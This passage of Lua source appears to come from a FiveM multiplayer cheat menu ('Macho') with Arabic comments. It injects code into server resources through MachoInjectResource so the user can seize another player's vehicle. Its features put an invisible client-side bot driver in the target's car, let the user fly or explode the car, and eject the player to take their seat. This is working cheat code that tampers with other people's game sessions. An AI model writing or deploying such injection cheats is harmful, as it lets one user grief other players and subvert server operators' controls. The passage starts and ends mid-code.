                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)

                                for i = 1, 50 do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end

                                Citizen.Wait(100)

                                ClearPedTasksImmediately(playerPed)

                                SetPedMoveRateOverride(playerPed, 1.0)
                                SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                TaskWanderStandard(playerPed, 0.0, 0)
                                Citizen.Wait(100)
                                ClearPedTasksImmediately(playerPed)

                                SetEntityVisible(playerPed, false, false)

                                Citizen.Wait(100)

                                ClearPedTasksImmediately(playerPed)
                                SetPedMoveRateOverride(playerPed, 1.0)
                                SetEntityAsMissionEntity(playerPed, false, false)

                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)

                                Citizen.Wait(100)

                                TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)

                                Citizen.Wait(600)

                                ClearPedTasks(playerPed)

                                -- بدء نظام Remote Car الكامل
                                if DoesEntityExist(targetVehicle) then
                                    local RemoteCar = {}
                                    local isSpectating = false
                                    local originalPlayerPed = nil
                                    local audioEnabled = true
                                    local originalAudioPos = nil
                                    local isFlying = false
                                    local flightSpeed = 25.0
                                    local flightAcceleration = 0.2
                                    local isHonking = false
                                    local originalLightState = 0

                                    RemoteCar.Start = function()
                                        local selectedVehicle = targetVehicle
                                        if not selectedVehicle or not DoesEntityExist(selectedVehicle) then
                                            return
                                        end
                                        RemoteCar.Entity = selectedVehicle
                                        RemoteCar.OriginalPed = PlayerPedId()
                                        originalAudioPos = GetEntityCoords(RemoteCar.OriginalPed)
                                        originalLightState = GetVehicleLightsState(RemoteCar.Entity) and 2 or 0
                                        local success = pcall(function()
                                            RemoteCar.CreateBotDriver()
                                        end)
                                        if not success then
                                            return
                                        end
                                        RemoteCar.StartSpectate()
                                        RemoteCar.SetupAudioSystem()
                                        Citizen.CreateThread(function()
                                            while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(0)
                                                pcall(function()
                                                    RemoteCar.UpdateAudioPosition()
                                                end)
                                                if isSpectating then
                                                    DisableControlAction(0, 30, true)
                                                    DisableControlAction(0, 31, true)
                                                    DisableControlAction(0, 21, true)
                                                    DisableControlAction(0, 22, true)
                                                    DisableControlAction(0, 44, true)
                                                    DisableControlAction(0, 55, true)
                                                    DisableControlAction(0, 76, true)
                                                    DisableControlAction(0, 23, true)
                                                    DisableControlAction(0, 75, true)
                                                    DisableControlAction(0, 101, true)
                                                    DisableControlAction(0, 102, true)
                                                    DisableControlAction(0, 26, true)
                                                    DisableControlAction(0, 0, true)
                                                    DisableControlAction(0, 140, true)
                                                    DisableControlAction(0, 141, true)
                                                    DisableControlAction(0, 142, true)
                                                    DisableControlAction(0, 143, true)
                                                    DisableControlAction(0, 263, true)
                                                    DisableControlAction(0, 264, true)
                                                    DisableControlAction(0, 24, true)
                                                    DisableControlAction(0, 25, true)
                                                    EnableControlAction(0, 172, true)
                                                    EnableControlAction(0, 173, true)
                                                    EnableControlAction(0, 174, true)
                                                    EnableControlAction(0, 175, true)
                                                    EnableControlAction(0, 32, true)
                                                    EnableControlAction(0, 33, true)
                                                    EnableControlAction(0, 34, true)
                                                    EnableControlAction(0, 35, true)
                                                    EnableControlAction(0, 22, true)
                                                    EnableControlAction(0, 21, true)
                                                    EnableControlAction(0, 47, true)
                                                    EnableControlAction(0, 73, true)
                                                    EnableControlAction(0, 246, true)
                                                    EnableControlAction(0, 44, true)
                                                    EnableControlAction(0, 48, true)
                                                    EnableControlAction(0, 108, true)
                                                    EnableControlAction(0, 23, true)
                                                    EnableControlAction(0, 51, true)
                                                end
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local distance = GetDistanceBetweenCoords(
                                                        GetEntityCoords(RemoteCar.OriginalPed),
                                                        GetEntityCoords(RemoteCar.Entity),
                                                        true
                                                    )
                                                    pcall(function()
                                                        RemoteCar.HandleKeys(distance)
                                                    end)
                                                    local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                    if vehicleCoords then
                                                        SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                                    end
                                                    if distance <= 2000.0 then
                                                        if not NetworkHasControlOfEntity(RemoteCar.BotPed) then
                                                            NetworkRequestControlOfEntity(RemoteCar.BotPed)
                                                        end
                                                        if not NetworkHasControlOfEntity(RemoteCar.Entity) then
                                                            NetworkRequestControlOfEntity(RemoteCar.Entity)
                                                        end
                                                    else
                                                        pcall(function()
                                                            TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                        end)
                                                    end
                                                else
                                                    break
                                                end
                                            end
                                            pcall(function()
                                                RemoteCar.Stop()
                                                ClearFocus()
                                            end)
                                        end)
                                    end

                                    RemoteCar.SetupAudioSystem = function()
                                        audioEnabled = true
                                        Citizen.CreateThread(function()
                                            while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) do
                                                Citizen.Wait(100)
                                                pcall(function()
                                                    RemoteCar.UpdateAudioPosition()
                                                end)
                                            end
                                        end)
                                    end

                                    RemoteCar.UpdateAudioPosition = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        pcall(function()
                                            local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                            SetAudioListenerPosition(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z)
                                            local velocity = GetEntityVelocity(RemoteCar.Entity)
                                            SetAudioListenerVelocity(velocity.x, velocity.y, velocity.z)
                                            local heading = GetEntityHeading(RemoteCar.Entity)
                                            local radHeading = math.rad(heading)
                                            local forwardX = -math.sin(radHeading)
                                            local forwardY = math.cos(radHeading)
                                            SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                            SetAudioFlag("AudioListenerEnabled", true)
                                            SetAudioFlag("LoadMPData", true)
                                            SetAudioFlag("DisableFlightMusic", true)
                                            SetAudioFlag("PauseBeatRepeats", false)
                                        end)
                                    end

                                    RemoteCar.ToggleAudio = function()
                                        audioEnabled = not audioEnabled
                                        if audioEnabled then
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                            MachoMenuNotification("Remote Car", "Audio enabled - hearing from vehicle position")
                                        else
                                            pcall(function()
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                    SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                    local playerVelocity = GetEntityVelocity(RemoteCar.OriginalPed)
                                                    SetAudioListenerVelocity(playerVelocity.x, playerVelocity.y, playerVelocity.z)
                                                    local playerHeading = GetEntityHeading(RemoteCar.OriginalPed)
                                                    local radHeading = math.rad(playerHeading)
                                                    local forwardX = -math.sin(radHeading)
                                                    local forwardY = math.cos(radHeading)
                                                    SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                                end
                                            end)
                                            MachoMenuNotification("Remote Car", "Audio disabled - returned to normal audio")
                                        end
                                    end

                                    RemoteCar.RestoreOriginalAudio = function()
                                        pcall(function()
                                            SetAudioFlag("AudioListenerEnabled", false)
                                            ClearAudioFlags()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                SetAudioListenerVelocity(0.0, 0.0, 0.0)
                                                SetAudioListenerOrientation(0.0, 1.0, 0.0, 0.0, 0.0, 1.0)
                                            end
                                        end)
                                    end

                                    RemoteCar.CreateBotDriver = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        RemoteCar.OriginalPed = PlayerPedId()

                                        pcall(function()
                                            local existingDriver = GetPedInVehicleSeat(RemoteCar.Entity, -1)
                                            if existingDriver and existingDriver ~= 0 and existingDriver ~= RemoteCar.OriginalPed then
                                                if not IsPedAPlayer(existingDriver) then
                                                    SetEntityAsMissionEntity(existingDriver, false, false)
                                                    DeleteEntity(existingDriver)
                                                else
                                                    TaskLeaveVehicle(existingDriver, RemoteCar.Entity, 0)
                                                end
                                            end
                                            for seat = 0, GetVehicleMaxNumberOfPassengers(RemoteCar.Entity) - 1 do
                                                local passenger = GetPedInVehicleSeat(RemoteCar.Entity, seat)
                                                if passenger and passenger ~= 0 and not IsPedAPlayer(passenger) then
                                                    SetEntityAsMissionEntity(passenger, false, false)
                                                    DeleteEntity(passenger)
                                                end
                                            end
                                        end)

                                        if not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end

                                        local modelHash = GetHashKey("mp_m_freemode_01")

                                        RequestModel(modelHash)
                                        local timeout = 0
                                        while not HasModelLoaded(modelHash) and timeout < 20 do
                                            Citizen.Wait(10)
                                            timeout = timeout + 1
                                        end

                                        if not HasModelLoaded(modelHash) or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end

                                        -- إنشاء البوت بطريقة client side فقط
                                        local coords = GetEntityCoords(RemoteCar.Entity)
                                        local heading = GetEntityHeading(RemoteCar.Entity)

                                        local success, botPed = pcall(function()
                                            return CreatePed(5, modelHash, coords.x, coords.y, coords.z, heading, false, false)
                                        end)

                                        if not success or not botPed or botPed == 0 then
                                            return
                                        end

                                        RemoteCar.BotPed = botPed

                                        pcall(function()
                                            -- جعل البوت client side فقط
                                            SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                            SetEntityInvincible(RemoteCar.BotPed, true)
                                            SetEntityVisible(RemoteCar.BotPed, true)
                                            SetPedAlertness(RemoteCar.BotPed, 0)
                                            SetPedCanRagdoll(RemoteCar.BotPed, false)
                                            SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                            SetPedCanBeDraggedOut(RemoteCar.BotPed, false)

                                            -- إخفاء البوت عن اللاعبين الآخرين
                                            SetEntityVisible(RemoteCar.BotPed, false, false)

                                            -- Thread منفصل لإظهار البوت محلياً فقط
                                            Citizen.CreateThread(function()
                                                while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                    Citizen.Wait(100)
                                                    -- إظهار البوت للاعب الحالي فقط
                                                    SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                    SetEntityVisible(RemoteCar.BotPed, true, false)
                                                    -- منع رؤية الآخرين للبوت
                                                    for i = 0, 255 do
                                                        if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                            SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                        end
                                                    end
                                                end
                                            end)
                                        end)

                                        -- إدخال البوت للسيارة
                                        local enterTimeout = 0
                                        while not IsPedInVehicle(RemoteCar.BotPed, RemoteCar.Entity) and enterTimeout < 5 and DoesEntityExist(RemoteCar.Entity) do
                                            Citizen.Wait(20)
                                            enterTimeout = enterTimeout + 1
                                            TaskWarpPedIntoVehicle(RemoteCar.BotPed, RemoteCar.Entity, -1)
                                        end
                                    end

                                    RemoteCar.StartSpectate = function()
                                        if not RemoteCar.BotPed or not DoesEntityExist(RemoteCar.BotPed) then
                                            return
                                        end
                                        if DoesCamExist(RemoteCar.SpectateCamera) then
                                            DestroyCam(RemoteCar.SpectateCamera)
                                        end
                                        local success, camera = pcall(function()
                                            return CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                        end)
                                        if not success or not camera then
                                            return
                                        end
                                        RemoteCar.SpectateCamera = camera
                                        SetCamFov(RemoteCar.SpectateCamera, 75.0)
                                        RemoteCar.CameraDistance = 8.0
                                        RemoteCar.CameraHeight = 3.0
                                        RemoteCar.CameraAngleHorizontal = 0.0
                                        RemoteCar.CameraAngleVertical = -10.0
                                        isSpectating = true
                                        RenderScriptCams(1, 0, 0, 1, 1)
                                        Citizen.CreateThread(function()
                                            while isSpectating and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(0)
                                                pcall(function()
                                                    if IsPedInAnyVehicle(RemoteCar.BotPed, false) then
                                                        local vehicle = GetVehiclePedIsIn(RemoteCar.BotPed, false)
                                                        if vehicle and DoesEntityExist(vehicle) then
                                                            local vehicleCoords = GetEntityCoords(vehicle)
                                                            local mouseX = GetDisabledControlNormal(0, 1) * 15.0
                                                            local mouseY = GetDisabledControlNormal(0, 2) * 8.0
                                                            RemoteCar.CameraAngleHorizontal = RemoteCar.CameraAngleHorizontal + mouseX
                                                            RemoteCar.CameraAngleVertical = math.max(-45.0, math.min(45.0, RemoteCar.CameraAngleVertical + mouseY))
                                                            if IsControlPressed(0, 15) then
                                                                RemoteCar.CameraDistance = math.max(3.0, RemoteCar.CameraDistance - 0.5)
                                                            elseif IsControlPressed(0, 16) then
                                                                RemoteCar.CameraDistance = math.min(15.0, RemoteCar.CameraDistance + 0.5)
                                                            end
                                                            local radianHorizontal = math.rad(RemoteCar.CameraAngleHorizontal)
                                                            local radianVertical = math.rad(RemoteCar.CameraAngleVertical)
                                                            local offsetX = math.sin(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                            local offsetY = math.cos(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                            local offsetZ = math.sin(radianVertical) * RemoteCar.CameraDistance
                                                            local cameraPos = vector3(
                                                                vehicleCoords.x + offsetX,
                                                                vehicleCoords.y + offsetY,
                                                                vehicleCoords.z + RemoteCar.CameraHeight + offsetZ
                                                            )
                                                            SetFocusPosAndVel(cameraPos.x, cameraPos.y, cameraPos.z, 0.0, 0.0, 0.0)
                                                            SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                            PointCamAtEntity(RemoteCar.SpectateCamera, vehicle, 0.0, 0.0, 0.0, true)
                                                            DisableControlAction(0, 1, true)
                                                            DisableControlAction(0, 2, true)
                                                            DisableControlAction(0, 15, true)
                                                            DisableControlAction(0, 16, true)
                                                            if IsControlJustPressed(0, 45) then
                                                                RemoteCar.CameraDistance = 8.0
                                                                RemoteCar.CameraHeight = 3.0
                                                                RemoteCar.CameraAngleHorizontal = 0.0
                                                                RemoteCar.CameraAngleVertical = -10.0
                                                            end
                                                            SetTextFont(4)
                                                            SetTextProportional(1)
                                                            SetTextScale(0.0, 0.4)
                                                            SetTextColour(255, 255, 255, 255)
                                                            SetTextEntry("STRING")
                                                            local speed = GetEntitySpeed(vehicle) * 3.6
                                                            local audioStatus = audioEnabled and "ON" or "OFF"
                                                            DrawText(0.02, 0.02)
                                                        end
                                                    end
                                                end)
                                            end
                                        end)
                                    end

                                    RemoteCar.StopSpectate = function()
                                        if isSpectating then
                                            isSpectating = false
                                            pcall(function()
                                                ClearFocus()
                                                if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                    local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                    SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                    ClearFocus()
                                                else
                                                    ClearFocus()
                                                end
                                                RenderScriptCams(0, 0, 0, 1, 0)
                                                if DoesCamExist(RemoteCar.SpectateCamera) then
                                                    DestroyCam(RemoteCar.SpectateCamera)
                                                    RemoteCar.SpectateCamera = nil
                                                end
                                                SetPlayerControl(PlayerId(), true, 0)
                                            end)
                                        end
                                    end

                                    RemoteCar.MakeVehicleExplode = function()
                                        if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                            return
                                        end
                                        pcall(function()
                                            ExplodeVehicleInCutscene(RemoteCar.Entity, true)
                                        end)
                                    end

                                    RemoteCar.HandleHonking = function()
                                        if IsControlPressed(0, 51) then
                                            if not isHonking then
                                                isHonking = true
                                                pcall(function()
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 0, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 1, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 2, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 3, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 4, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 5, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 6, false, false)
                                                    SetVehicleDoorOpen(RemoteCar.Entity, 7, false, false)
                                                end)
                                            end
                                        else
                                            if isHonking then
                                                isHonking = false
                                                pcall(function()
                                                    if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                        for i = 0, 7 do
                                                            SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                        end
                                                    end
                                                end)
                                            end
                                        end
                                    end

                                    RemoteCar.HandleKeys = function(distance)
                                        if IsControlJustReleased(0, 23) then
                                            isFlying = not isFlying
                                            pcall(function()
                                                if isFlying then
                                                    SetVehicleGravity(RemoteCar.Entity, false)
                                                    SetEntityCollision(RemoteCar.Entity, false, false)
                                                    SetEntityCollision(RemoteCar.BotPed, false, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, GetEntityHeading(RemoteCar.Entity), 2, true)
                                                    SetEntityDynamic(RemoteCar.Entity, false)
                                                    SetEntityDynamic(RemoteCar.BotPed, false)
                                                else
                                                    SetVehicleGravity(RemoteCar.Entity, true)
                                                    SetEntityCollision(RemoteCar.Entity, true, true)
                                                    SetEntityCollision(RemoteCar.BotPed, true, true)
                                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                    PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                    SetEntityDynamic(RemoteCar.Entity, true)
                                                    SetEntityDynamic(RemoteCar.BotPed, true)
                                                end
                                            end)
                                        end
                                        if IsControlJustReleased(0, 47) then
                                            if isSpectating then
                                                RemoteCar.StopSpectate()
                                            else
                                                RemoteCar.StartSpectate()
                                            end
                                        end
                                        if IsControlJustPressed(0, 45) then
                                            pcall(function()
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    SetVehicleFixed(RemoteCar.Entity)
                                                    SetVehicleDeformationFixed(RemoteCar.Entity)
                                                    SetVehicleUndriveable(RemoteCar.Entity, false)
                                                    SetVehicleEngineOn(RemoteCar.Entity, true, true, false)
                                                    StopEntityFire(RemoteCar.Entity)
                                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                                    local heading = GetEntityHeading(RemoteCar.Entity)
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z + 1.0, false, false, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                    if not isFlying then
                                                        PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                    end

                                                    if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                        DeleteEntity(RemoteCar.BotPed)
                                                    end

                                                    local modelHash = GetHashKey("mp_m_freemode_01")
                                                    if not HasModelLoaded(modelHash) then
                                                        RequestModel(modelHash)
                                                        while not HasModelLoaded(modelHash) do
                                                            Citizen.Wait(10)
                                                        end
                                                    end

                                                    -- إعادة إنشاء البوت كـ client-side بالكامل
                                                    RemoteCar.BotPed = CreatePedInsideVehicle(RemoteCar.Entity, 5, modelHash, -1, false, false)
                                                    SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                                    SetEntityInvincible(RemoteCar.BotPed, true)
                                                    SetPedAlertness(RemoteCar.BotPed, 0)
                                                    SetPedCanRagdoll(RemoteCar.BotPed, false)
                                                    SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                                    SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                                    SetEntityVisible(RemoteCar.BotPed, false, false) -- إخفاء البوت عن الجميع

                                                    -- Thread منفصل لإظهار البوت محلياً فقط
                                                    Citizen.CreateThread(function()
                                                        while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                            Citizen.Wait(100)
                                                            -- إظهار البوت للاعب الحالي فقط
                                                            SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                            SetEntityVisible(RemoteCar.BotPed, true, false)
                                                            -- منع رؤية الآخرين للبوت
                                                            for i = 0, 255 do
                                                                if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                                    SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                                end
                                                            end
                                                        end
                                                    end)

                                                    if isSpectating and RemoteCar.SpectateCamera and DoesCamExist(RemoteCar.SpectateCamera) then
                                                        RemoteCar.CameraDistance = 8.0
                                                        RemoteCar.CameraHeight = 3.0
                                                        RemoteCar.CameraAngleHorizontal = 0.0
                                                        RemoteCar.CameraAngleVertical = -10.0

                                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                        local cameraPos = vector3(
                                                            vehicleCoords.x,
                                                            vehicleCoords.y - 8.0,
                                                            vehicleCoords.z + 3.0
                                                        )
                                                        SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                        PointCamAtEntity(RemoteCar.SpectateCamera, RemoteCar.Entity, 0.0, 0.0, 0.0, true)
                                                    end
                                                end
                                            end)
                                        end
                                        if IsControlJustPressed(0, 73) then
                                            RemoteCar.Stop()
                                            ClearFocus()
                                            return
                                        end
                                        if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                            local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                            if vehicleCoords then
                                                SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                            end
                                            pcall(function()
                                                if IsControlJustReleased(0, 26) then
                                                    RemoteCar.MakeVehicleExplode()
                                                end
                                                RemoteCar.HandleHonking()
                                                if isFlying then
                                                    local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                    local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                    local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                    local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                    local up = IsControlPressed(0, 22)
                                                    local down = IsControlPressed(0, 36)
                                                    local boost = IsControlPressed(0, 21)
                                                    local heading = GetEntityHeading(RemoteCar.Entity)
                                                    local radHeading = math.rad(heading)
                                                    local moveX = 0.0
                                                    local moveY = 0.0
                                                    local moveZ = 0.0
                                                    SetVehicleGravity(RemoteCar.Entity, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                    if forward then
                                                        moveX = moveX - math.sin(radHeading) * flightSpeed
                                                        moveY = moveY + math.cos(radHeading) * flightSpeed
                                                    end
                                                    if backward then
                                                        moveX = moveX + math.sin(radHeading) * flightSpeed
                                                        moveY = moveY - math.cos(radHeading) * flightSpeed
                                                    end
                                                    if left then
                                                        heading = heading + 3.0
                                                        SetEntityHeading(RemoteCar.Entity, heading)
                                                    end
                                                    if right then
                                                        heading = heading - 3.0
                                                        SetEntityHeading(RemoteCar.Entity, heading)
                                                    end
                                                    if up then
                                                        moveZ = moveZ + flightSpeed
                                                    end
                                                    if down then
                                                        moveZ = moveZ - flightSpeed
                                                    end
                                                    if boost then
                                                        moveX = moveX * 2.0
                                                        moveY = moveY * 2.0
                                                        moveZ = moveZ * 2.0
                                                    end
                                                    local currentCoords = GetEntityCoords(RemoteCar.Entity)
                                                    local newCoords = vector3(
                                                        currentCoords.x + (moveX * 0.02),
                                                        currentCoords.y + (moveY * 0.02),
                                                        currentCoords.z + (moveZ * 0.02)
                                                    )
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                                else
                                                    local boost = IsControlPressed(0, 21)
                                                    local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                    local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                    local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                    local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                    local brake = IsControlPressed(0, 22)
                                                    local actionTaken = false
                                                    if boost and RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                        SetVehicleForwardSpeed(RemoteCar.Entity, GetEntitySpeed(RemoteCar.Entity) + 2.0)
                                                    end
                                                    if forward and left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 7, 1)
                                                        actionTaken = true
                                                    elseif forward and right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 8, 1)
                                                        actionTaken = true
                                                    elseif backward and left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 13, 1)
                                                        actionTaken = true
                                                    elseif backward and right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 14, 1)
                                                        actionTaken = true
                                                    elseif forward then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 9, 1)
                                                        actionTaken = true
                                                    elseif backward then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 22, 1)
                                                        actionTaken = true
                                                    elseif left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 4, 1)
                                                        actionTaken = true
                                                    elseif right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 5, 1)
                                                        actionTaken = true
                                                    elseif brake then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 1000)
                                                        actionTaken = true
                                                    end
                                                    if not actionTaken then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                    end
                                                end
                                            end)
                                        end
                                    end

                                    RemoteCar.Stop = function()
                                        pcall(function()
                                            RemoteCar.StopSpectate()
                                            RemoteCar.RestoreOriginalAudio()
                                            if isFlying then
                                                isFlying = false
                                                SetVehicleGravity(RemoteCar.Entity, true)
                                                SetEntityCollision(RemoteCar.Entity, true, true)
                                                SetEntityCollision(RemoteCar.BotPed, true, true)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                SetEntityDynamic(RemoteCar.Entity, true)
                                                SetEntityDynamic(RemoteCar.BotPed, true)
                                            end
                                            if isHonking then
                                                isHonking = false
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    for i = 0, 3 do
                                                        SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                    end
                                                    SetVehicleLights(RemoteCar.Entity, originalLightState)
                                                end
                                            end
                                            ClearFocus()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                ClearFocus()
                                            end
                                            if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                DeleteEntity(RemoteCar.BotPed)
                                            end
                                            RemoteCar.Entity = nil
                                            RemoteCar.BotPed = nil
                                            RemoteCar.OriginalPed = nil
                                            audioEnabled = false
                                        end)
                                    end

                                    RemoteCar.Start()
                                end

                                SetEntityVisible(playerPed, true, false)
                            end
                        end)
                    ]])
                        MachoMenuNotification("Remote Car", "Started remote control for Player ID: " .. GetPlayerServerId(selectedPlayer) .. "'s vehicle")
                    else
                        MachoMenuNotification("Remote Car", "No resources found!")
                    end
                else
                    MachoMenuNotification("Error", "Selected player is not in a vehicle")
                end
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    
    -- CallbackDisabled: This code runs when the checkbox is unselected (disabling remote control)
    function()
        -- Destroy the DUI directly from here
        if menuDUI then
            MachoDestroyDui(menuDUI)
            menuDUI = nil
            menuVisible = false
            MachoMenuNotification("Remote Car", "Remote control session ended and menu closed.")
        end
    end
)
MachoMenuButton(PlayerSection, "hijack Player Vehicle", function()
   local selectedPlayer = MachoMenuGetSelectedPlayer()  
   if selectedPlayer and selectedPlayer ~= -1 then      
       local targetPed = GetPlayerPed(selectedPlayer)   
       if targetPed and DoesEntityExist(targetPed) then
           ClearPedTasksImmediately(PlayerPedId())
           local targetVehicle = GetVehiclePedIsIn(targetPed, false)
           if targetVehicle ~= 0 then
               MachoInjectResource("any", [[
                   Citizen.CreateThread(function()
                       local playerPed = PlayerPedId()
                       local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                       local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                       
                       if targetVehicle ~= 0 then
                           SetPedMoveRateOverride(playerPed, 10.0)
                           ClearPedTasks(playerPed)
                           SetVehicleForwardSpeed(targetVehicle, 0.0)
                           SetVehicleDoorsLocked(targetVehicle, 1)
                           SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                           
                           TaskLeaveVehicle(targetPed, targetVehicle, 0)
                           
                           SetPedMoveRateOverride(playerPed, 3.0)
                           
                           ClearPedTasks(playerPed)
                           SetVehicleForwardSpeed(targetVehicle, 0.0)
                           
                           SetPedIntoVehicle(playerPed, targetVehicle, -1)
                           TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                           
                           SetPedMoveRateOverride(playerPed, 1.0)
                       end
                   end)
               ]])
